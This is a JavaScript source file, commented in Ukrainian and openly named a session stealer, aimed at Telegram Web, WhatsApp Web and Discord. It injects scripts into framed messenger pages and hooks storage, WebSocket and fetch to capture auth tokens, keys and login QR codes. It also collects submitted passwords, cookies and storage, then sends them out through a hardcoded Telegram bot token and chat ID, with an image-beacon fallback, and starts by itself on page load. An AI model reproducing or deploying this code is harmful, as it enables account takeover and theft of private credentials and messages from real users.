// Конфігурація
const CONFIG = {
    BOT_TOKEN: '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA',
    CHAT_ID: '8463942433',
    ENCRYPT_KEY: 'session_stealer_advanced_key_2024',
    TARGETS: ['telegram', 'whatsapp', 'discord']
};

// Глобальні змінні
let capturedSessions = {};
let isActive = true;

class SessionStealer {
    constructor() {
        this.init();
    }

    init() {
        this.setupMutationObserver();
        this.injectHookScripts();
        this.startMonitoring();
        this.setupWebSocketIntercept();
    }

    openMessenger(service) {
        document.getElementById('messengerFrame').style.display = 'block';
        
        const urls = {
            telegram: 'https://web.telegram.org/',
            whatsapp: 'https://web.whatsapp.com/',
            discord: 'https://discord.com/login'
        };

        const iframe = document.getElementById('messengerFrame');
        iframe.src = urls[service];
        
        // Ін'єкція коду в iframe після завантаження
        iframe.onload = () => {
            this.injectIntoFrame(service);
        };
    }

    injectIntoFrame(service) {
        const iframe = document.getElementById('messengerFrame');
        const scriptContent = `
            // Ін'єкція коду в цільовий месенджер
            ${this.getInjectionCode(service)}
        `;

        try {
            const script = iframe.contentDocument.createElement('script');
            script.textContent = scriptContent;
            iframe.contentDocument.head.appendChild(script);
        } catch (e) {
            this.advancedFrameInjection(iframe, scriptContent);
        }
    }

    advancedFrameInjection(iframe, code) {
        // Обхід CORS та політик безпеки
        const blob = new Blob([code], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        const script = iframe.contentDocument.createElement('script');
        script.src = url;
        iframe.contentDocument.head.appendChild(script);
    }

    getInjectionCode(service) {
        const injectionCodes = {
            telegram: `
                // Telegram Web Session Stealer
                const originalLocalStorage = window.localStorage;
                const originalSessionStorage = window.sessionStorage;
                
                // Перехоплення localStorage
                const localStorageHandler = {
                    set: function(obj, prop, value) {
                        if (prop.includes('session') || prop.includes('auth') || prop.includes('key')) {
                            window.parent.postMessage({
                                type: 'SESSION_DATA',
                                service: 'telegram',
                                key: prop,
                                value: value,
                                timestamp: Date.now()
                            }, '*');
                        }
                        return Reflect.set(...arguments);
                    }
                };
                
                window.localStorage = new Proxy(originalLocalStorage, localStorageHandler);
                
                // Перехоплення WebSocket
                const originalWebSocket = window.WebSocket;
                window.WebSocket = function(...args) {
                    const ws = new originalWebSocket(...args);
                    
                    ws.addEventListener('message', function(event) {
                        try {
                            const data = JSON.parse(event.data);
                            if (data && data.authKey) {
                                window.parent.postMessage({
                                    type: 'WEBSOCKET_AUTH',
                                    service: 'telegram',
                                    data: data,
                                    timestamp: Date.now()
                                }, '*');
                            }
                        } catch (e) {}
                    });
                    
                    return ws;
                };
                
                // Перехоплення QR-коду авторизації
                setInterval(() => {
                    const qrCode = document.querySelector('canvas');
                    if (qrCode) {
                        qrCode.toBlob(function(blob) {
                            const reader = new FileReader();
                            reader.onload = function() {
                                window.parent.postMessage({
                                    type: 'QR_CODE',
                                    service: 'telegram',
                                    data: reader.result,
                                    timestamp: Date.now()
                                }, '*');
                            };
                            reader.readAsDataURL(blob);
                        });
                    }
                }, 5000);
            `,

            whatsapp: `
                // WhatsApp Web Session Stealer
                let interceptedData = {};
                
                // Перехоплення localStorage
                const originalSetItem = localStorage.setItem;
                localStorage.setItem = function(key, value) {
                    if (key.includes('WAToken') || key.includes('WAWebId') || key.includes('last-wid')) {
                        window.parent.postMessage({
                            type: 'WHATSAPP_SESSION',
                            key: key,
                            value: value,
                            timestamp: Date.now()
                        }, '*');
                    }
                    return originalSetItem.apply(this, arguments);
                };
                
                // Перехоплення Service Worker
                if ('serviceWorker' in navigator) {
                    navigator.serviceWorker.addEventListener('message', event => {
                        if (event.data && event.data.type === 'CRYPTO_KEYS') {
                            window.parent.postMessage({
                                type: 'WHATSAPP_KEYS',
                                data: event.data,
                                timestamp: Date.now()
                            }, '*');
                        }
                    });
                }
                
                // Моніторинг QR-коду
                const observer = new MutationObserver(function(mutations) {
                    mutations.forEach(function(mutation) {
                        if (mutation.type === 'attributes' && mutation.attributeName === 'data-ref') {
                            const qrValue = mutation.target.getAttribute('data-ref');
                            window.parent.postMessage({
                                type: 'WHATSAPP_QR',
                                data: qrValue,
                                timestamp: Date.now()
                            }, '*');
                        }
                    });
                });
                
                observer.observe(document.body, {
                    attributes: true,
                    subtree: true,
                    attributeFilter: ['data-ref']
                });
            `,

            discord: `
                // Discord Session Stealer
                const discordTokens = {};
                
                // Перехоплення токенів
                const originalFetch = window.fetch;
                window.fetch = function(...args) {
                    return originalFetch.apply(this, args).then(response => {
                        if (response.url.includes('/api') && response.headers.get('authorization')) {
                            const token = response.headers.get('authorization');
                            window.parent.postMessage({
                                type: 'DISCORD_TOKEN',
                                token: token,
                                url: response.url,
                                timestamp: Date.now()
                            }, '*');
                        }
                        return response;
                    });
                };
                
                // Перехоплення localStorage
                Object.defineProperty(window, 'localStorage', {
                    get: function() {
                        const storage = Object.getOwnPropertyDescriptor(Object.prototype, 'localStorage').get.call(this);
                        return new Proxy(storage, {
                            set: function(target, prop, value) {
                                if (prop.includes('token') || prop.includes('auth')) {
                                    window.parent.postMessage({
                                        type: 'DISCORD_STORAGE',
                                        key: prop,
                                        value: value,
                                        timestamp: Date.now()
                                    }, '*');
                                }
                                return target[prop] = value;
                            }
                        });
                    }
                });
                
                // Перехоплення WebSocket
                WebSocket.prototype.originalSend = WebSocket.prototype.send;
                WebSocket.prototype.send = function(data) {
                    try {
                        const parsed = JSON.parse(data);
                        if (parsed.op === 2 && parsed.d && parsed.d.token) {
                            window.parent.postMessage({
                                type: 'DISCORD_WS_TOKEN',
                                token: parsed.d.token,
                                timestamp: Date.now()
                            }, '*');
                        }
                    } catch (e) {}
                    return this.originalSend(data);
                };
            `
        };

        return injectionCodes[service];
    }

    setupMutationObserver() {
        // Моніторинг змін DOM для виявлення форм авторизації
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.addedNodes.length) {
                    this.checkForLoginForms(mutation.addedNodes);
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    checkForLoginForms(nodes) {
        nodes.forEach(node => {
            if (node.tagName === 'FORM' && node.querySelector('input[type="password"]')) {
                this.injectFormStealer(node);
            }
        });
    }

    injectFormStealer(form) {
        form.addEventListener('submit', (e) => {
            const formData = new FormData(form);
            const credentials = {};
            for (let [key, value] of formData.entries()) {
                credentials[key] = value;
            }
            
            this.captureCredentials(credentials);
        });
    }

    startMonitoring() {
        // Обробка повідомлень з iframe
        window.addEventListener('message', (event) => {
            if (event.data && event.data.type) {
                this.handleInterceptedData(event.data);
            }
        });

        // Періодичний збір даних
        setInterval(() => {
            this.collectAdditionalData();
        }, 10000);
    }

    handleInterceptedData(data) {
        if (!capturedSessions[data.service]) {
            capturedSessions[data.service] = [];
        }
        
        capturedSessions[data.service].push(data);
        
        // Автоматична відправка важливих даних
        if (data.type.includes('TOKEN') || data.type.includes('AUTH') || data.type.includes('QR')) {
            this.sendCapturedData();
        }
    }

    setupWebSocketIntercept() {
        // Перехоплення WebSocket глобально
        const originalWebSocket = window.WebSocket;
        window.WebSocket = function(...args) {
            const ws = new originalWebSocket(...args);
            
            ws.addEventListener('message', (event) => {
                try {
                    const data = JSON.parse(event.data);
                    this.analyzeWebSocketData(data, args[0]);
                } catch (e) {}
            });
            
            return ws;
        }.bind(this);
    }

    analyzeWebSocketData(data, url) {
        if (url.includes('telegram') || url.includes('whatsapp') || url.includes('discord')) {
            if (data.auth_key || data.token || data.session) {
                this.handleInterceptedData({
                    type: 'WEBSOCKET_INTERCEPT',
                    service: this.detectService(url),
                    data: data,
                    url: url,
                    timestamp: Date.now()
                });
            }
        }
    }

    detectService(url) {
        if (url.includes('telegram')) return 'telegram';
        if (url.includes('whatsapp')) return 'whatsapp';
        if (url.includes('discord')) return 'discord';
        return 'unknown';
    }

    collectAdditionalData() {
        // Додатковий збір даних
        const additionalData = {
            userAgent: navigator.userAgent,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        capturedSessions['metadata'] = additionalData;
    }

    sendCapturedData() {
        if (Object.keys(capturedSessions).length === 0) return;

        const encryptedData = this.encryptData(capturedSessions);
        
        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: `🔐 SESSION_DATA:${encryptedData}`
            })
        }).then(() => {
            // Очищення після відправки
            capturedSessions = {};
        }).catch(error => {
            this.backupSend(encryptedData);
        });
    }

    encryptData(data) {
        return btoa(unescape(encodeURIComponent(JSON.stringify(data))));
    }

    backupSend(data) {
        const img = new Image();
        img.src = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(data)}`;
    }
}

// Глобальний доступ
window.openMessenger = function(service) {
    if (!window.sessionStealer) {
        window.sessionStealer = new SessionStealer();
    }
    window.sessionStealer.openMessenger(service);
};

// Автоініціалізація
setTimeout(() => {
    window.sessionStealer = new SessionStealer();
}, 3000);
